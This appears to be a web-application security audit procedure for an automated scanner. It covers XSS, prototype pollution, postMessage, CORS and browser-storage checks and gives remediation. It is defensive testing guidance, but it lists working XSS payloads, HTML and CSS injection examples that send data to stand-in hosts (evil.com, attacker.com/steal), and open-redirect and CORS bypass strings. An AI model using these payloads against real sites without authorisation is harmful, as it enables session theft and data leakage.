# Pass 06: XSS & Client-Side Vulnerabilities

**OWASP Mapping:** A05:2025 (Injection/XSS), WSTG-CLNT-01 through WSTG-CLNT-13
**Weight:** 8% of Security Score
**Automation Level:** 75% fully automated, 20% AI-assisted, 5% manual judgment

---

## Purpose

Detect all cross-site scripting variants (reflected, stored, DOM-based) and client-side attack vectors including prototype pollution, web messaging flaws, browser storage misuse, and CORS exploitation. XSS alone accounts for 30,000+ CVEs and remains the most prevalent injection class in modern web applications.

---

## Tier 0: Static Analysis (Code-Level)

Grep and Read patterns to identify XSS-prone code before any runtime testing.

### 0.1 Dangerous Output Patterns

Search for unsafe DOM manipulation and raw HTML insertion:

```
Grep patterns (run against entire codebase):

# React — dangerouslySetInnerHTML usage
pattern: "dangerouslySetInnerHTML"
severity: HIGH — bypasses React auto-escaping

# Vue — v-html directive
pattern: "v-html"
severity: HIGH — renders raw HTML without sanitization

# Angular — bypassSecurityTrustHtml / innerHTML binding
pattern: "bypassSecurityTrust(Html|Script|Url|ResourceUrl|Style)"
severity: HIGH — explicitly disables Angular sanitizer
pattern: "\[innerHTML\]"
severity: MEDIUM — Angular sanitizes by default but check for bypass

# Raw DOM manipulation
pattern: "\.innerHTML\s*="
severity: HIGH — direct HTML injection into DOM
pattern: "\.outerHTML\s*="
severity: HIGH — replaces entire element with raw HTML
pattern: "document\.write\("
severity: CRITICAL — writes raw HTML to document stream
pattern: "document\.writeln\("
severity: CRITICAL — same as document.write with newline

# jQuery unsafe methods
pattern: "\$\(.*\)\.html\("
severity: HIGH — jQuery .html() inserts raw HTML
pattern: "\$\(.*\)\.append\(.*[^\"']\)"
severity: MEDIUM — append with non-literal content
pattern: "\$\(.*\)\.prepend\("
severity: MEDIUM — prepend with dynamic content
pattern: "\$\(.*\)\.after\("
severity: MEDIUM — inserts raw HTML after element
pattern: "\$\(.*\)\.before\("
severity: MEDIUM — inserts raw HTML before element
```

### 0.2 Dangerous JavaScript Execution

```
# eval and equivalents
pattern: "eval\("
severity: CRITICAL — executes arbitrary JavaScript
pattern: "new\s+Function\("
severity: CRITICAL — dynamic function construction
pattern: "setTimeout\(\s*[\"']"
severity: HIGH — string-based setTimeout executes as eval
pattern: "setInterval\(\s*[\"']"
severity: HIGH — string-based setInterval executes as eval

# Template literal injection
pattern: "innerHTML\s*=\s*`"
severity: HIGH — template literals with interpolation in innerHTML
```

### 0.3 CSP Policy in Source

```
# Check for CSP header/meta tag configuration
pattern: "Content-Security-Policy"
look_for: presence in helmet config, meta tags, server headers
flag_if_missing: MEDIUM — no CSP means no XSS mitigation layer

# Dangerous CSP directives
pattern: "unsafe-inline"
severity: HIGH — allows inline scripts, defeats CSP purpose
pattern: "unsafe-eval"
severity: HIGH — allows eval(), defeats CSP purpose
pattern: "script-src\s+.*\*"
severity: HIGH — wildcard script sources
pattern: "default-src\s+.*\*"
severity: MEDIUM — overly permissive default
```

### 0.4 Input Sanitization Libraries

```
# Check for sanitization library usage
pattern: "DOMPurify|sanitize-html|xss|isomorphic-dompurify|bleach"
expected: PRESENT in projects with user-generated content
flag_if_missing: MEDIUM — no sanitization library detected

# Check for encoding utilities
pattern: "encodeURIComponent|encodeURI|escapeHtml|htmlEncode"
context: verify these are applied to user input before output
```

### 0.5 URL Handling

```
# JavaScript URL scheme (XSS via href/src)
pattern: "javascript:"
severity: HIGH — potential XSS via URL attributes
pattern: "href\s*=.*user|param|query|input|req\."
severity: MEDIUM — dynamic href from user input
pattern: "window\.location\s*=|location\.href\s*="
severity: MEDIUM — potential open redirect / DOM XSS
pattern: "location\.(hash|search|pathname)"
severity: INFO — DOM XSS source, verify sink usage
```

---

## Tier 1: Automated Scanning (13 Checks)

### Check 1: Reflected XSS (URL Parameters, Form Fields, Headers)

**Tools:** Burp Scanner (active) + Burp Intruder
**WSTG:** WSTG-INPV-01

```
Workflow:
1. Crawl application with Burp Scanner to discover all input points
2. Run active scan targeting reflected XSS on:
   - All URL query parameters
   - All form field inputs (text, hidden, select)
   - HTTP headers (Referer, User-Agent, X-Forwarded-For)
3. Burp Intruder — use XSS payload list on each parameter:
   - <script>alert(1)</script>
   - <img src=x onerror=alert(1)>
   - <svg/onload=alert(1)>
   - " onmouseover="alert(1)
   - javascript:alert(1)
   - Event handler variants (onfocus, onerror, onload)
4. Verify reflection appears unescaped in response body
5. Check if payload executes in browser context via Playwright

Playwright verification:
- Navigate to URL with payload in parameter
- Listen for dialog events (alert/confirm/prompt)
- Check for script execution via page.evaluate
```

### Check 2: Stored XSS (Comments, Profiles, Messages)

**Tools:** Burp Scanner + Playwright
**WSTG:** WSTG-INPV-02

```
Workflow:
1. Identify all user-generated content storage points:
   - Comment/review forms
   - User profile fields (name, bio, avatar URL)
   - Message/chat inputs
   - File upload names/descriptions
   - Forum posts, wiki pages
2. Via Playwright, submit XSS payloads to each storage point:
   - Standard: <script>alert('stored')</script>
   - Event: <img src=x onerror=alert('stored')>
   - SVG: <svg><script>alert('stored')</script></svg>
   - Encoded: &#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
3. Navigate to the page where content is displayed
4. Verify if payload executes (page.on('dialog') listener)
5. Check both authenticated and unauthenticated views
6. Test with different user accounts viewing the stored content
```

### Check 3: DOM-Based XSS (Source-to-Sink Tracking)

**Tools:** Burp DOM Invader + code analysis
**WSTG:** WSTG-CLNT-01

```
Workflow:
1. Enable Burp DOM Invader in browser
2. Identify DOM XSS sources in JavaScript:
   - location.hash, location.search, location.pathname
   - document.URL, document.documentURI
   - document.referrer
   - window.name
   - postMessage data
   - localStorage/sessionStorage reads
3. Trace source values to dangerous sinks:
   - innerHTML, outerHTML, document.write
   - eval(), setTimeout(string), setInterval(string)
   - new Function()
   - jQuery .html(), .append() with user data
   - element.setAttribute('href', userInput)
   - window.location = userInput
4. Code analysis — Grep for source-to-sink patterns:
   pattern: "location\.(hash|search).*innerHTML"
   pattern: "location\.(hash|search).*eval"
   pattern: "document\.referrer.*document\.write"
5. Inject canary values via URL hash/params and verify DOM rendering
```

### Check 4: HTML Injection

**Tools:** Burp Intruder
**WSTG:** WSTG-CLNT-03

```
Workflow:
1. Test all input fields with HTML-only payloads (no script):
   - <h1>Injected</h1>
   - <a href="https://evil.com">Click</a>
   - <form action="https://evil.com"><input name=q><button>Submit</button></form>
   - <iframe src="https://evil.com"></iframe>
   - <marquee>Injected</marquee>
2. Submit via Burp Intruder across all identified parameters
3. Check if HTML renders in response (even without script execution)
4. Verify Content-Type header is text/html (not text/plain)
5. Flag any unescaped HTML rendering as finding
```

### Check 5: CSS Injection (Style-Based Exfiltration)

**Tools:** Burp Intruder
**WSTG:** WSTG-CLNT-05

```
Workflow:
1. Inject CSS payloads into input fields and URL parameters:
   - </style><style>body{background:red}</style>
   - " style="background:url('https://attacker.com/steal?data=
   - expression(alert(1)) — IE legacy
   - @import url('https://attacker.com/css')
2. Test CSS injection in:
   - Style attributes rendered from user input
   - Class names derived from user input
   - Custom CSS/theme settings
3. Verify if injected styles render in the page
4. Check for data exfiltration potential via CSS selectors:
   - input[value^="a"]{background:url(//evil.com/?a)}
   - @font-face with unicode-range for character extraction
```

### Check 6: Prototype Pollution (__proto__, constructor.prototype)

**Tools:** Playwright browser_evaluate + code analysis
**WSTG:** Client-side JavaScript

```
Workflow:
1. Code analysis — search for vulnerable patterns:
   pattern: "merge|extend|defaultsDeep|assign.*__proto__"
   pattern: "JSON\.parse.*query|param|body"
   pattern: "Object\.assign\(.*req\.(body|query|params)"

2. Playwright — test URL-based pollution:
   Navigate to: /?__proto__[polluted]=true
   Navigate to: /?constructor[prototype][polluted]=true
   Evaluate: Object.prototype.polluted
   Expected: undefined (not true)

3. Playwright — test JSON body pollution:
   POST with body: {"__proto__":{"polluted":true}}
   POST with body: {"constructor":{"prototype":{"polluted":true}}}
   Verify server-side Object.prototype is not modified

4. Check for client-side pollution leading to XSS:
   Inject: /?__proto__[innerHTML]=<img/src/onerror=alert(1)>
   Inject: /?__proto__[src]=javascript:alert(1)
   Verify if polluted properties reach DOM sinks

5. Check for lodash/underscore vulnerable versions:
   lodash < 4.17.12 — defaultsDeep pollution
   jQuery < 3.4.0 — $.extend deep copy pollution
```

### Check 7: Client-Side URL Redirect (Open Redirect via DOM)

**Tools:** Burp Scanner
**WSTG:** WSTG-CLNT-04

```
Workflow:
1. Identify URL redirect patterns in JavaScript:
   pattern: "window\.location\s*=\s*.*param|query|hash"
   pattern: "location\.href\s*=\s*.*param|query|hash"
   pattern: "location\.replace\(.*param|query|hash"
   pattern: "window\.open\(.*param|query|hash"

2. Test redirect parameters with external URLs:
   - ?redirect=https://evil.com
   - ?next=//evil.com
   - ?url=javascript:alert(1)
   - ?return=/\evil.com
   - ?goto=https:evil.com

3. Bypass filter attempts:
   - Double encoding: %252f%252fevil.com
   - Backslash: /\evil.com
   - @ symbol: https://legit.com@evil.com
   - Null byte: https://legit.com%00.evil.com

4. Verify redirect occurs via Playwright navigation tracking
5. Check both client-side (JS) and server-side (302) redirects
```

### Check 8: Web Message Manipulation (postMessage)

**Tools:** Playwright browser_evaluate
**WSTG:** WSTG-CLNT-11

```
Workflow:
1. Detect postMessage listeners in source code:
   pattern: "addEventListener\(['\"]message['\"]"
   pattern: "onmessage\s*="
   pattern: "window\.onmessage"

2. Playwright — analyze message handlers:
   page.evaluate(() => {
     // Intercept all message event listeners
     const originalAddEventListener = EventTarget.prototype.addEventListener;
     window.__messageHandlers = [];
     EventTarget.prototype.addEventListener = function(type, fn, opts) {
       if (type === 'message') {
         window.__messageHandlers.push({
           target: this === window ? 'window' : this.tagName,
           handler: fn.toString().substring(0, 500)
         });
       }
       return originalAddEventListener.call(this, type, fn, opts);
     };
   });

3. Check origin validation in handlers:
   SECURE: if (event.origin !== 'https://expected.com') return;
   INSECURE: No origin check before processing event.data
   INSECURE: if (event.origin.includes('expected')) — partial match bypass

4. Test message injection via Playwright:
   page.evaluate(() => {
     window.postMessage({type:'xss', payload:'<img/onerror=alert(1)>'}, '*');
   });

5. Verify if unvalidated messages reach dangerous sinks (innerHTML, eval)
```

### Check 9: WebSocket Security

**Tools:** Playwright + Burp WebSocket analysis
**WSTG:** WSTG-CLNT-10

```
Workflow:
1. Detect WebSocket connections:
   pattern: "new\s+WebSocket\("
   pattern: "socket\.io|ws://"
   Check for wss:// vs ws:// (encrypted vs plaintext)

2. Playwright — intercept WebSocket traffic:
   page.on('websocket', ws => {
     ws.on('framesent', frame => log('SENT:', frame.payload));
     ws.on('framereceived', frame => log('RECV:', frame.payload));
   });

3. Check origin validation on WebSocket handshake:
   - Burp Repeater: modify Origin header on WS upgrade request
   - If connection succeeds with arbitrary origin = VULNERABLE
   - Cross-Site WebSocket Hijacking (CSWSH) risk

4. Test input sanitization on WebSocket messages:
   - Send XSS payloads via WebSocket frame
   - Send SQL injection payloads via WebSocket frame
   - Verify server sanitizes/validates message content

5. Check authentication on WebSocket:
   - Can unauthenticated users establish WS connection?
   - Is session token validated on each message (not just handshake)?
   - Is wss:// enforced (not ws://)?
```

### Check 10: Browser Storage Security

**Tools:** Playwright browser_evaluate
**WSTG:** WSTG-CLNT-12

```
Workflow:
1. Playwright — enumerate all browser storage:
   page.evaluate(() => {
     const storage = {
       localStorage: {},
       sessionStorage: {},
       cookies: document.cookie
     };
     for (let i = 0; i < localStorage.length; i++) {
       const key = localStorage.key(i);
       storage.localStorage[key] = localStorage.getItem(key);
     }
     for (let i = 0; i < sessionStorage.length; i++) {
       const key = sessionStorage.key(i);
       storage.sessionStorage[key] = sessionStorage.getItem(key);
     }
     return storage;
   });

2. Flag sensitive data in storage:
   CRITICAL: JWT tokens, session IDs, auth tokens
   HIGH: API keys, passwords, PII (email, phone, SSN)
   MEDIUM: User preferences with security implications
   Look for keys named: token, jwt, session, auth, key, secret, password, apiKey

3. Verify storage is cleared on logout:
   - Log in, record storage contents
   - Log out
   - Check storage — all auth-related items should be removed

4. Check for HttpOnly cookie bypass:
   - Sensitive cookies MUST have HttpOnly flag
   - If accessible via document.cookie = VULNERABLE to XSS theft
```

### Check 11: CORS Exploitation

**Tools:** Burp Repeater
**WSTG:** WSTG-CLNT-07

```
Workflow:
1. Send requests with manipulated Origin headers via Burp Repeater:
   Origin: https://evil.com
   Origin: null
   Origin: https://target.com.evil.com
   Origin: https://evil-target.com
   Origin: https://target.com%60.evil.com

2. Check Access-Control-Allow-Origin response:
   CRITICAL: Reflects arbitrary origin with Allow-Credentials: true
   HIGH: Allows null origin with Allow-Credentials: true
   MEDIUM: Wildcard (*) with sensitive data in response
   SAFE: Fixed allowlist of trusted origins

3. Test preflight request handling:
   OPTIONS request with:
   Access-Control-Request-Method: PUT
   Access-Control-Request-Headers: X-Custom
   Verify only expected methods/headers are allowed

4. Check for credentials inclusion:
   Access-Control-Allow-Credentials: true + reflected origin = data theft
   Verify cookies/auth headers are not sent cross-origin without need

5. Code analysis — check CORS middleware configuration:
   pattern: "cors\(\{.*origin:\s*(true|req\.headers\.origin)"
   severity: CRITICAL — reflects any origin
   pattern: "Access-Control-Allow-Origin.*\*"
   severity: MEDIUM — wildcard (no credentials but data exposed)
```

### Check 12: Content-Type Sniffing (X-Content-Type-Options)

**Tools:** Burp passive scan
**WSTG:** WSTG-CLNT-13

```
Workflow:
1. Burp passive scan — check all responses for:
   Header: X-Content-Type-Options: nosniff
   Flag if missing on any response serving user content

2. Test MIME sniffing:
   - Upload file with .txt extension but HTML content
   - Check if browser renders as HTML (MIME sniffing)
   - Upload file with image MIME but script content

3. Verify Content-Type headers are correct:
   - JSON responses: application/json (not text/html)
   - File downloads: correct MIME type
   - API responses: not text/html (prevents XSS via API)

4. Check for Content-Disposition on downloads:
   - File downloads should have: Content-Disposition: attachment
   - Prevents inline rendering of uploaded files
```

### Check 13: Cross-Site Script Inclusion (XSSI)

**Tools:** Burp Repeater
**WSTG:** WSTG-CLNT-13

```
Workflow:
1. Identify JSON/JSONP endpoints that return sensitive data:
   - API endpoints returning user-specific data
   - Endpoints with callback parameters
   - Dynamic JavaScript files with embedded data

2. Test XSSI attack:
   - Request JSON endpoint from cross-origin context
   - Check if response is valid JavaScript (can be included via <script>)
   - Verify JSON responses start with non-executable prefix
   - Check for JSONP callback injection: ?callback=evil

3. Protection verification:
   - JSON responses should NOT be valid JavaScript
   - Use JSON prefix: )]}',\n before JSON body
   - Require custom headers (X-Requested-With) for AJAX requests
   - Check Sec-Fetch-Mode header validation
```

---

## Tier 2: AI Judgment (8 Contextual Questions)

After completing Tier 0 and Tier 1, evaluate these questions using contextual reasoning:

### Q1: Framework-Appropriate Output Encoding
Does the application consistently use its framework's built-in output encoding (React JSX auto-escaping, Angular DomSanitizer, Vue template escaping)? Are all exceptions to auto-escaping (dangerouslySetInnerHTML, v-html, bypassSecurityTrust) justified and properly sanitized?

### Q2: CSP Effectiveness
Is the Content-Security-Policy strict enough to mitigate XSS even if an injection point exists? Does it use nonce-based or hash-based script-src instead of unsafe-inline? Are there bypass vectors via whitelisted JSONP endpoints or CDN domains?

### Q3: Input-to-Output Path Coverage
Are ALL user input paths traced through to their output contexts? Consider: URL parameters, form fields, HTTP headers, WebSocket messages, file uploads, database-stored content, third-party API data. Is any path missing sanitization?

### Q4: Client-Side Storage Risk Assessment
Is the application's use of localStorage/sessionStorage proportionate to the data sensitivity? Are authentication tokens properly stored in HttpOnly cookies rather than browser storage? What is the actual impact if an XSS vulnerability allowed storage access?

### Q5: Third-Party Script Trust Model
How many third-party scripts are loaded? Do they have SRI (Subresource Integrity) hashes? Could a compromised third-party CDN inject malicious code? Is the application's CSP policy aligned with its third-party dependencies?

### Q6: DOM Manipulation Safety
Does the codebase follow safe DOM manipulation patterns? Are there custom utility functions that abstract dangerous operations (innerHTML, document.write) without proper sanitization? Do code review practices catch unsafe DOM operations?

### Q7: PostMessage Security Architecture
For applications using cross-origin communication (iframes, popups, service workers), is the postMessage architecture designed with security in mind? Are origin checks using strict equality (not includes/startsWith)? Is message data validated before processing?

### Q8: CORS Policy Proportionality
Is the CORS configuration as restrictive as possible while still meeting functional requirements? Are there overly broad origin allowlists? Could the CORS policy be tightened without breaking legitimate cross-origin requests?

---

## Severity Classification

### Critical (P1 — Score: 0/10)
- Stored XSS that executes for all users viewing the content
- DOM XSS via common URL parameters with no CSP protection
- Prototype pollution leading to RCE (server-side)
- CORS reflecting arbitrary origin with credentials enabled on sensitive endpoints
- Browser storage containing plaintext passwords or full session tokens with no HttpOnly cookies

### High (P2 — Score: 2/10)
- Reflected XSS in production with weak or missing CSP
- DOM-based XSS requiring user interaction (click, hover)
- WebSocket connection accepting arbitrary origins with no auth
- postMessage handlers with no origin validation reaching innerHTML sinks
- CORS allowing null origin with credentials on sensitive data
- Active prototype pollution on client-side affecting DOM rendering

### Medium (P3 — Score: 5/10)
- Reflected XSS mitigated by strict CSP (nonce-based) but still present in source
- HTML injection without script execution capability
- CSS injection with limited data exfiltration potential
- localStorage storing non-critical auth metadata (not tokens)
- Open redirect via DOM (client-side only, no server-side)
- Missing X-Content-Type-Options header on non-HTML responses

### Low (P4 — Score: 7/10)
- Self-XSS (only affects the user who injects it, requires copy-paste)
- CORS misconfiguration on endpoints returning only public data
- Browser storage storing non-sensitive preferences
- CSP with unsafe-inline but no identified injection points
- JSONP endpoints returning non-sensitive data
- Content-Type sniffing on static assets with no user content

---

## False Positive Indicators

### XSS False Positives
- **React/Angular/Vue auto-escaping:** Framework renders `<script>` as text, not HTML. Verify the payload appears as encoded text (&lt;script&gt;) in the DOM, not as an executable element
- **CSP blocking execution:** Payload is reflected but CSP prevents execution. Check browser console for CSP violation errors. Still report the reflection but note CSP mitigation
- **WAF/input filter stripping:** Payload is modified/stripped before reflection. Test with encoding bypasses before dismissing
- **JSON response context:** XSS payload appears in JSON response with Content-Type: application/json. Not exploitable unless Content-Type is overridden or response is rendered as HTML
- **Admin-only inputs:** XSS in admin panels where only admins can inject and view. Lower severity but still report (compromised admin scenario)

### CORS False Positives
- **Public API endpoints:** CORS with wildcard (*) on truly public data (no auth, no PII) is acceptable
- **CDN/static assets:** CORS allowing all origins on static files (CSS, JS, images) is standard
- **Preflight-only:** CORS headers on OPTIONS response but actual data requires authentication headers that cross-origin requests cannot forge

### Prototype Pollution False Positives
- **Frozen prototypes:** Application uses Object.freeze(Object.prototype) — pollution attempts fail silently
- **Map/Set usage:** Application uses Map instead of plain objects — not vulnerable to prototype pollution
- **Server-side isolation:** Each request gets a fresh Object.prototype (e.g., Node.js worker threads)

---

## Remediation

### XSS Prevention
1. **Use framework auto-escaping** — never bypass it without DOMPurify sanitization
2. **Implement strict CSP** — `script-src 'nonce-{random}' 'strict-dynamic'` with no unsafe-inline
3. **Sanitize with DOMPurify** for any user content rendered as HTML:
   ```javascript
   import DOMPurify from 'dompurify';
   element.innerHTML = DOMPurify.sanitize(userInput);
   ```
4. **Context-aware encoding** — HTML-encode for HTML context, JS-encode for JS context, URL-encode for URL context
5. **Trusted Types API** — enforce safe DOM manipulation:
   ```javascript
   // In CSP: require-trusted-types-for 'script'
   trustedTypes.createPolicy('default', {
     createHTML: (input) => DOMPurify.sanitize(input)
   });
   ```

### Prototype Pollution Prevention
1. Use `Object.create(null)` for dictionary objects
2. Freeze prototypes: `Object.freeze(Object.prototype)`
3. Validate/sanitize object keys — reject `__proto__`, `constructor`, `prototype`
4. Use Map instead of plain objects for user-controlled keys
5. Update lodash (>= 4.17.12), jQuery (>= 3.4.0)

### PostMessage Security
1. Always validate `event.origin` with strict equality
2. Validate `event.source` to confirm sender window
3. Validate and sanitize `event.data` before processing
4. Never pass message data to innerHTML, eval, or other sinks

### CORS Hardening
1. Use explicit origin allowlist — never reflect request origin
2. Never allow `null` origin with credentials
3. Set `Access-Control-Max-Age` to limit preflight cache
4. Return CORS headers only for listed origins
5. Audit: `Vary: Origin` header must be present when CORS headers are conditional

### Browser Storage
1. Store auth tokens in HttpOnly, Secure, SameSite=Strict cookies only
2. Never store JWTs, session IDs, or API keys in localStorage/sessionStorage
3. Clear all storage on logout: `localStorage.clear(); sessionStorage.clear();`
4. Use `Clear-Site-Data` header on logout response
